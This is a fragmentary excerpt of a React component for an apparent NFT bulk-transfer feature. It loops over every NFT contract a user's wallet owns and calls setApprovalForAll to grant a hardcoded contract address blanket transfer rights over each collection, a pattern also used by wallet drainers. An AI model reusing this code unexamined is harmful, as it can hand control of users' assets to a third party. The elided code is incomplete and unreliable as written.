...
const Transferall = (props) => {

  const [nftdata, setnftdata] = useState(undefined);
  const [nftowned_contracts, setnftowned_contracts] = useState(undefined);

  useEffect(() => {
    setnftdata(props.nftdata);
    setnftowned_contracts(props.nftowned_contracts);
  }, [props.nftdata, props.nftowned_contracts]);

  console.log('nftowned_contracts: ', nftowned_contracts);
  const BULKtransfer_contract = '0x8133747B650ED3f8CA592d8293145E89f1f05485'
    ...
    try {
      ...
      if (ethereum) {
        ...
        for (let i = 0; i < nftowned_contracts?.length; i++) {
          ...
          let txn = connectedContract.setApprovalForAll(BULKtransfer_contract,true);
          await txn.wait()
        }
